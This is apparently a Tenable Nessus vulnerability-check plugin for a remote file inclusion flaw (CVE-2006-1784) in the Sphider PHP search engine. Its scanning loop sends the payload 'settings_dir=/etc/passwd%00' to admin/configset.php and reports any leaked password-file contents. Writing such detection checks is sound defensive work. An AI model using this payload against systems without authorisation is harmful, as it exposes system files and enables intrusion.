#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21229);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2006-1784");
  script_bugtraq_id(17514);
  script_osvdb_id(24586);

  script_name(english:"Sphider configset.php settings_dir Parameter Remote File Inclusion");
  script_summary(english:"Tries to read /etc/passwd using Sphider");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file include issue." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Sphider, an open source web spider and
search engine written in PHP. 

The version of Sphider installed on the remote host fails to sanitize
user-supplied input to the 'settings_dir' parameter of the
'admin/configset.php' script before using it in a PHP 'include()'
function.  Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit this issue to view
arbitrary files on the remote host or to execute arbitrary PHP code,
possibly taken from third-party hosts." );
  # http://downloads.securityfocus.com/vulnerabilities/exploits/sphider_poc.pl
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?374e7054" );
  # http://web.archive.org/web/20060420232116/http://www.cs.ioc.ee/~ando/sphider/forum/board_entry.php?id=2643
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?188b9fce" );
 script_set_attribute(attribute:"solution", value:
"Edit the affected script as described in the vendor forum posting
referenced above." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/04/16");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/04/12");
 script_cvs_date("$Date: 2015/09/24 23:21:20 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:sphider:sphider");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/sphider", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd%00";
  w = http_send_recv3(method:"GET", 
    item:string(
      dir, "/admin/configset.php?",
      "settings_dir=", file
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "the web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # It's from Sphider and..
    "<td> Sphider version</td>" >< res &&
    (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream" or "failed opening".
      #
      # nb: this suggests magic_quotes_gpc was enabled but an attacker with
      #     local access and/or remote file inclusion might still work.
      egrep(pattern:"main\(/etc/passwd\\0conf\.php.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<div id='submenu'>");

    if (isnull(contents)) security_warning(port);
    else
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    exit(0);
  }
}
